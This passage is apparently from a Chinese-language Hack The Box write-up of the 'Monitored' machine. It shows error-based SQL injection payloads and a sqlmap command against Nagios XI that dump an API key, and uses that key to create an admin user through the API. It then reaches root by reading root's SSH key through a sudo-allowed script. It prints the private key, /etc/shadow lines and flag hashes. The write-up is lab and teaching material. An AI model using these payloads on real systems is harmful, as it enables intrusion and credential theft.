navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 86</span><br><span class="line"></span><br><span class="line">action=acknowledge_banner_message&amp;token=215cdfd1e65022e0e31033a01122b8b400ba9c3e&amp;id=3</span><br></pre></td></tr></table></figure>
+
+<p>結果顯示 <code>&#123;&quot;message&quot;:&quot;Failed to acknowledge message.&quot;,&quot;msg_type&quot;:&quot;error&quot;&#125;</code>​ ，然後試了一下sql注入：</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114154314-7oudnfi.png" alt="image">​</p>
+<p>可以猜到，上面的cookie是需要的，程序創建一個臨時的cookie，然後用token來加權限。</p>
+<p>所以token只能用一次，然後把權限賦值到cookie上，如果cookie過期了，會一直提示<code>Your session has timed out.</code>​，這個時候只需要用瀏覽器訪問一次 <code>https://nagios.monitored.htb/nagiosxi/login.php</code>​ 按下F12複製一下cookie貼到burp，重新生成一個token就可以了。</p>
+<p>既然出現了錯誤，嘗試error-based注入看看：</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114155043-untrpqq.png" alt="image">​</p>
+<p>根據上面CVE的提示，我們知道兩個表名：<code>xi_session</code>​ and <code>xi_users</code>​，看起來很重要，所以嘗試dump出來看看。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Dump Current Database</span></span><br><span class="line">action=acknowledge_banner_message&amp;token=c54f40d23babb51d339c058fda65918958e623d7&amp;<span class="built_in">id</span>=1 AND extractvalue(rand(),concat(CHAR(126),database(),CHAR(126)))--</span><br><span class="line">得到：nagiosxi</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump column for nagiosxi.xi_users</span></span><br><span class="line">action=acknowledge_banner_message&amp;token=c54f40d23babb51d339c058fda65918958e623d7&amp;<span class="built_in">id</span>=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=<span class="string">&#x27;xi_users&#x27;</span> LIMIT 1,1)))--</span><br><span class="line">得到：username，password，name，email，backend_ticket，enabled，api_key，api_enabled，login_attempts，last_attempt，last_password_change，last_login，last_edited，last_edited_by，created_by，created_time</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump data for nagiosxi.xi_users</span></span><br><span class="line">action=acknowledge_banner_message&amp;token=c54f40d23babb51d339c058fda65918958e623d7&amp;<span class="built_in">id</span>=1 AND ExtractValue(<span class="string">&#x27;&#x27;</span>,Concat(<span class="string">&#x27;=&#x27;</span>,SUBSTRING((select group_concat(concat_ws(&#x27;|&#x27;,name,&#x27;|&#x27;,api_key,&#x27;|&#x27;) SEPARATOR &quot;,&quot; ) FROM nagiosxi.xi_users) , <span class="number">10</span>, <span class="number">50</span>) )) -</span><br><span class="line">得到：Nagios Administrator,IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL</span><br></pre></td></tr></table></figure>
+
+<p>得到 api_key : <code>IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL</code>​ </p>
+<p>也可以用sqlmap去注入，不過需要注意cookie的問題，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=`curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d &quot;</span>username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=500<span class="string">&quot; | awk -F&#x27;&quot;</span><span class="string">&#x27; &#x27;</span>&#123;<span class="built_in">print</span><span class="variable">$12</span>&#125;<span class="string">&#x27;`&quot; --level 5 --risk 3 -p id --batch</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114144634-f399mu5.png" alt="image">​</p>
+<p>‍</p>
+<h2 id="0x7-使用API創建一個管理員。"><a href="#0x7-使用API創建一個管理員。" class="headerlink" title="0x7 使用API創建一個管理員。"></a>0x7 使用API創建一個管理員。</h2><p>但現在得到了 api_key，然後谷歌了很久看到這篇：</p>
+<blockquote>
+<p>You can use the new REST API to add users.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST &quot;http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=LTltbjobR0X3V5ViDIitYaI8hjsjoFBaOcWYukamF7oAsD8lhJRvSPWq8I3PjTf7&amp;pretty=1&quot; -d &quot;username=jmcdouglas&amp;password=test&amp;name=Jordan%20McDouglas&amp;email=jmcdouglas@localhost&quot;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;success&quot;: &quot;User account jmcdouglas was added successfully!&quot;,</span><br><span class="line">    &quot;userid&quot;: 13</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The REST API documentation is available in the Nagios XI web UI, under the “Help” menu.</p>
+<p>Hope this helps.</p>
+<p><a target="_blank" rel="noopener" href="https://support.nagios.com/forum/viewtopic.php?f=16&t=42923">https://support.nagios.com/forum/viewtopic.php?f=16&amp;t=42923</a></p>
+</blockquote>
+<p>所以好奇試了下，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -k -XPOST <span class="string">&quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&quot;</span> -d <span class="string">&quot;username=mane&amp;password=mane&amp;name=mane&amp;email=mane@localhost&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;success&quot;</span>: <span class="string">&quot;User account mane was added successfully!&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user_id&quot;</span>: 6</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然後成功增加了用戶，<a target="_blank" rel="noopener" href="https://nagios.monitored.htb/nagiosxi/login.php">https://nagios.monitored.htb/nagiosxi/login.php</a> 登錄剛剛增加的用戶，但是發現這個用戶是普通用戶，并不是管理員。</p>
+<p>谷歌了很久，都沒有關於這個api的文檔，於是試下github找找，看到了這個：</p>
+<blockquote>
+<p>res &#x3D; send_request_cgi({<br>      ‘uri’&#x3D;&gt; “&#x2F;nagiosxi&#x2F;api&#x2F;v1&#x2F;system&#x2F;user”,<br>      ‘method’ &#x3D;&gt; ‘POST’,<br>      ‘ctype’ &#x3D;&gt; ‘application&#x2F;x-www-form-urlencoded’,<br>      ‘vars_get’ &#x3D;&gt; {<br>        ‘apikey’ &#x3D;&gt; key,<br>        ‘pretty’ &#x3D;&gt; 1<br>      },<br>      ‘vars_post’ &#x3D;&gt;{<br>        ‘username’   &#x3D;&gt; username,<br>        ‘password’   &#x3D;&gt; passwd,<br>        ‘name’       &#x3D;&gt; rand_text_alpha(rand(5) + 5),<br>        ‘email’      &#x3D;&gt;”#{username}@localhost”,<br>        ‘auth_level’ &#x3D;&gt;’admin’,<br>        ‘force_pw_change’ &#x3D;&gt; 0<br>      }<br>    })</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hahwul/mad-metasploit/blob/a718d5e7a95eec2283ab0f8b464649b5cfb191a4/archive/exploits/linux/remote/44969.rb#L206">https://github.com/hahwul/mad-metasploit/blob/a718d5e7a95eec2283ab0f8b464649b5cfb191a4/archive/exploits/linux/remote/44969.rb#L206</a></p>
+</blockquote>
+<p>他帶上了一個 <code>auth_level=admin</code>​，所以curl看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ curl -k -XPOST <span class="string">&quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&quot;</span> -d <span class="string">&quot;?&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;error&quot;</span>: <span class="string">&quot;Could not create user. Missing required fields.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;missing&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;username&quot;</span>,</span><br><span class="line">        <span class="string">&quot;email&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ curl -k -XPOST <span class="string">&quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&quot;</span> -d <span class="string">&quot;auth_level&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;error&quot;</span>: <span class="string">&quot;Could not create user. Missing required fields.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;messages&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;auth_level&quot;</span>: <span class="string">&quot;Must be either user or admin.&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;missing&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;username&quot;</span>,</span><br><span class="line">        <span class="string">&quot;email&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以改成：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -k -XPOST <span class="string">&quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&quot;</span> -d <span class="string">&quot;username=powerbymane&amp;password=mane&amp;name=power&amp;email=power@localhost&amp;auth_level=admin&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;success&quot;</span>: <span class="string">&quot;User account powerbymane was added successfully!&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user_id&quot;</span>: 9</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然後在這裏登錄：<code>https://nagios.monitored.htb/</code>​ </p>
+<p>‍</p>
+<h2 id="0x8-Shell-on-the-box"><a href="#0x8-Shell-on-the-box" class="headerlink" title="0x8 Shell on the box"></a>0x8 Shell on the box</h2><p>登錄了以後，隨便重設一個密碼，然後點 <code>Configure -&gt; Core Config Manager</code>​ ，點 <code>Commands</code>​，新建一個命令，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114171654-anea797.png" alt="image">​</p>
+<p>保存，然後在左邊的 <code>Monitoring</code>​ -&gt; <code>Services</code>​ -&gt; <code>Add New</code>​</p>
+<p>​​<img src="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114172015-jaed39g.png" alt="image">​​</p>
+<p>‍</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114172027-i60otlq.png" alt="image">​</p>
+<p>得到user shell。</p>
+<h2 id="0x9-Root"><a href="#0x9-Root" class="headerlink" title="0x9 Root"></a>0x9 Root</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">nagios@monitored:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> nagios on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User nagios may run the following commands on localhost:</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/nagios start</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/nagios stop</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/nagios restart</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/nagios reload</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/nagios status</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/nagios checkconfig</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/npcd start</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/npcd stop</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/npcd restart</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/npcd reload</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/npcd status</span><br><span class="line">    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *</span><br><span class="line">    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *</span><br><span class="line">    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *</span><br><span class="line">    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh</span><br><span class="line">    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh</span><br><span class="line">    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh</span><br><span class="line">    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *</span><br><span class="line">    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh</span><br><span class="line">    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *</span><br><span class="line">    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *</span><br></pre></td></tr></table></figure>
+
+<p>找一下</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114173936-4vv4z2k.png" alt="image">​</p>
+<p>可以看到 <a target="_blank" rel="noopener" href="https://www.tenable.com/security/research/tra-2020-61">https://www.tenable.com/security/research/tra-2020-61</a> 這個并不適用，因爲是UID 1001在運行。</p>
+<p>‍</p>
+<p>之後搜索 <code>/usr/local/nagiosxi/scripts/components/</code>​ 之類的，看到了幾篇，但都不適用，比如：</p>
+<p><a target="_blank" rel="noopener" href="https://skylightcyber.com/2021/05/20/13-nagios-vulnerabilities-7-will-shock-you/">https://skylightcyber.com/2021/05/20/13-nagios-vulnerabilities-7-will-shock-you/</a> 什麽的。</p>
+<p>‍</p>
+<p>後來嘗試分析 <code>/usr/local/nagiosxi/scripts/components/getprofile.sh</code>​ 裏面讀取的文件，看到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">226 <span class="built_in">echo</span> <span class="string">&quot;Copying objects.cache...&quot;</span></span><br><span class="line">227 objects_cache_file=$(<span class="built_in">cat</span> /usr/local/nagios/etc/nagios.cfg | sed -n -e <span class="string">&#x27;s/^object_cache_file=//p&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">228 <span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$objects_cache_file</span>&quot;</span> <span class="string">&quot;/usr/local/nagiosxi/var/components/profile/<span class="variable">$folder</span>/&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -lah /usr/local/nagios/etc/nagios.cfg</span><br><span class="line">-rw-rw-r-- 1 www-data nagios 5.8K Jan 14 04:18 /usr/local/nagios/etc/nagios.cfg</span><br></pre></td></tr></table></figure>
+
+<p>有讀寫的權限，所以就想辦法改一下。</p>
+<p>‍</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi object_cache_file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索 object_cache_file 改成如下</span></span><br><span class="line"></span><br><span class="line">object_cache_file=/root/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>保存后</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /usr/local/nagiosxi/scripts/components/getprofile.sh mane</span><br><span class="line">$ <span class="built_in">cp</span> /usr/local/nagiosxi/var/components/profile.zip .</span><br><span class="line">$ unzip profile.zip</span><br><span class="line">$ <span class="built_in">cat</span> id_rsa</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAnZYnlG22OdnxaaK98DJMc9isuSgg9wtjC0r1iTzlSRVhNALtSd2C</span><br><span class="line">FSINj1byqeOkrieC8Ftrte+9eTrvfk7Kpa8WH0S0LsotASTXjj4QCuOcmgq9Im5SDhVG7/</span><br><span class="line">z9aEwa3bo8u45+7b+zSDKIolVkGogA6b2wde5E3wkHHDUXfbpwQKpURp9oAEHfUGSDJp6V</span><br><span class="line">bok57e6nS9w4mj24R4ujg48NXzMyY88uhj3HwDxi097dMcN8WvIVzc+/kDPUAPm+l/8w89</span><br><span class="line">9MxTIZrV6uv4/iJyPiK1LtHPfhRuFI3xe6Sfy7//UxGZmshi23mvavPZ6Zq0qIOmvNTu17</span><br><span class="line">V5wg5aAITUJ0VY9xuIhtwIAFSfgGAF4MF/P+zFYQkYLOqyVm++2hZbSLRwMymJ5iSmIo4p</span><br><span class="line">lbxPjGZTWJ7O/pnXzc5h83N2FSG0+S4SmmtzPfGntxciv2j+F7ToMfMTd7Np9/lJv3Yb8J</span><br><span class="line">/mxP2qnDTaI5QjZmyRJU3bk4qk9shTnOpXYGn0/hAAAFiJ4coHueHKB7AAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAJ2WJ5RttjnZ8WmivfAyTHPYrLkoIPcLYwtK9Yk85UkVYTQC7UndghUiDY9W8qnj</span><br><span class="line">pK4ngvBba7XvvXk6735OyqWvFh9EtC7KLQEk144+EArjnJoKvSJuUg4VRu/8/WhMGt26PL</span><br><span class="line">uOfu2/s0gyiKJVZBqIAOm9sHXuRN8JBxw1F326cECqVEafaABB31BkgyaelW6JOe3up0vc</span><br><span class="line">OJo9uEeLo4OPDV8zMmPPLoY9x8A8YtPe3THDfFryFc3Pv5Az1AD5vpf/MPPfTMUyGa1err</span><br><span class="line">+P4icj4itS7Rz34UbhSN8Xukn8u//1MRmZrIYtt5r2rz2ematKiDprzU7te1ecIOWgCE1C</span><br><span class="line">dFWPcbiIbcCABUn4BgBeDBfz/sxWEJGCzqslZvvtoWW0i0cDMpieYkpiKOKZW8T4xmU1ie</span><br><span class="line">zv6Z183OYfNzdhUhtPkuEpprcz3xp7cXIr9o/he06DHzE3ezaff5Sb92G/Cf5sT9qpw02i</span><br><span class="line">OUI2ZskSVN25OKpPbIU5zqV2Bp9P4QAAAAMBAAEAAAGAWkfuAQEhxt7viZ9sxbFrT2sw+R</span><br><span class="line">reV+o0IgIdzTQP/+C5wXxzyT+YCNdrgVVEzMPYUtXcFCur952TpWJ4Vpp5SpaWS++mcq/t</span><br><span class="line">PJyIybsQocxoqW/Bj3o4lEzoSRFddGU1dxX9OU6XtUmAQrqAwM+++9wy+bZs5ANPfZ/EbQ</span><br><span class="line">qVnLg1Gzb59UPZ51vVvk73PCbaYWtIvuFdAv71hpgZfROo5/QKqyG/mqLVep7mU2HFFLC3</span><br><span class="line">dI0UL15F05VToB+xM6Xf/zcejtz/huui5ObwKMnvYzJAe7ViyiodtQe5L2gAfXxgzS0kpT</span><br><span class="line">/qrvvTewkKNIQkUmCRvBu/vfaUhfO2+GceGB3wN2T8S1DhSYf5ViIIcVIn8JGjw1Ynr/zf</span><br><span class="line">FxsZJxc4eKwyvYUJ5fVJZWSyClCzXjZIMYxAvrXSqynQHyBic79BQEBwe1Js6OYr+77AzW</span><br><span class="line">8oC9OPid/Er9bTQcTUbfME9Pjk9DVU/HyT1s2XH9vnw2vZGKHdrC6wwWQjesvjJL4pAAAA</span><br><span class="line">wQCEYLJWfBwUhZISUc8IDmfn06Z7sugeX7Ajj4Z/C9Jwt0xMNKdrndVEXBgkxBLcqGmcx7</span><br><span class="line">RXsFyepy8HgiXLML1YsjVMgFjibWEXrvniDxy2USn6elG/e3LPok7QBql9RtJOMBOHDGzk</span><br><span class="line">ENyOMyMwH6hSCJtVkKnUxt0pWtR3anRe42GRFzOAzHmMpqby1+D3GdilYRcLG7h1b7aTaU</span><br><span class="line">BKFb4vaeUaTA0164Wn53N89GQ+VZmllkkLHN1KVlQfszL3FrYAAADBAMuUrIoF7WY55ier</span><br><span class="line">050xuzn9OosgsU0kZuR/CfOcX4v38PMI3ch1IDvFpQoxsPmGMQBpBCzPTux15QtQYcMqM0</span><br><span class="line">XVZpstqB4y33pwVWINzpAS1wv+I+VDjlwdOTrO/DJiFsnLuA3wRrlb7jdDKC/DP/I/90bx</span><br><span class="line">1rcSEDG4C2stLwzH9crPdaZozGHXWU03vDZNos3yCMDeKlLKAvaAddWE2R0FJr62CtK60R</span><br><span class="line">wL2dRR3DI7+Eo2pDzCk1j9H37YzYHlbwAAAMEAxim0OTlYJOWdpvyb8a84cRLwPa+v4EQC</span><br><span class="line">GgSoAmyWM4v1DeRH9HprDVadT+WJDHufgqkWOCW7x1I/K42CempxM1zn1iNOhE2WfmYtnv</span><br><span class="line">2amEWwfnTISDFY/27V7S3tpJLeBl2q40Yd/lRO4g5UOsLQpuVwW82sWDoa7KwglG3F+TIV</span><br><span class="line">csj0t36sPw7lp3H1puOKNyiFYCvHHueh8nlMI0TA94RE4SPi3L/NVpLh3f4EYeAbt5z96C</span><br><span class="line">CNvArnlhyB8ZevAAAADnJvb3RAbW9uaXRvcmVkAQIDBA==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>得到 root 的 id_rsa，嘗試連接下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i ./key root@10.129.61.234</span><br><span class="line">Linux monitored 5.10.0-27-amd64 <span class="comment">#1 SMP Debian 5.10.205-2 (2023-12-31) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Jan 14 01:05:33 2024 from 10.10.16.23</span><br><span class="line">root@monitored:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@monitored:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@monitored:~<span class="comment"># sha1sum root.txt</span></span><br><span class="line">5f9c83a9154db1c2a5e8c5c8151c5b16e7b5773b  root.txt</span><br><span class="line">root@monitored:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>完成。</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@monitored:~<span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$y$j9T<span class="variable">$LLy</span>.W6CI0K6McgXMKio0i1<span class="variable">$1omBVYjsg</span>.8qEzyjkL.3kXtpAMZNc7x9CMwOnrwltJ8:19671:0:99999:7:::</span><br><span class="line">daemon:*:19670:0:99999:7:::</span><br><span class="line">bin:*:19670:0:99999:7:::</span><br><span class="line">sys:*:19670:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19670:0:99999:7:::</span><br><span class="line">games:*:19670:0:99999:7:::</span><br><span class="line">man:*:19670:0:99999:7:::</span><br><span class="line">lp:*:19670:0:99999:7:::</span><br><span class="line">mail:*:19670:0:99999:7:::</span><br><span class="line">news:*:19670:0:99999:7:::</span><br><span class="line">uucp:*:19670:0:99999:7:::</span><br><span class="line">proxy:*:19670:0:99999:7:::</span><br><span class="line">www-data:*:19670:0:99999:7:::</span><br><span class="line">backup:*:19670:0:99999:7:::</span><br><span class="line">list:*:19670:0:99999:7:::</span><br><span class="line">irc:*:19670:0:99999:7:::</span><br><span class="line">gnats:*:19670:0:99999:7:::</span><br><span class="line">nobody:*:19670:0:99999:7:::</span><br><span class="line">_apt:*:19670:0:99999:7:::</span><br><span class="line">systemd-network:*:19670:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19670:0:99999:7:::</span><br><span class="line">messagebus:*:19670:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19670:0:99999:7:::</span><br><span class="line">avahi-autoipd:*:19670:0:99999:7:::</span><br><span class="line">sshd:*:19670:0:99999:7:::</span><br><span class="line">svc:$y$j9T<span class="variable">$JKvaJakBax4xU3</span>.kZFe221<span 